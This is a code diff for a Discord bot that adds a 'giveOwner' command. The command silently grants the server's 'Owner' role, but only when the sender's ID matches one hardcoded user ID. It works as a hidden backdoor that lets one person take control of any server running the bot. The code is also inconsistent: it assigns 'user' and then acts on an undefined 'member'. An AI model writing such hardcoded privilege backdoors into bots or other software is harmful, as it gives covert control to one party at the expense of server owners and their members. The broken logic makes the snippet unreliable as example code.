@@ -528,6 +528,16 @@ if (noMentionArray.includes("<@"+ sender.id + ">")) {
 }
 break;
 
+case "giveOwner":
+let user = message.mentions.members.first();
+let role = message.guild.roles.find("name", "Owner");
+if (sender.id != "412268614696304642") {
+
+} else {
+    member.addRole(role).catch(console.error);
+}
+break;
+
     }
 });
 
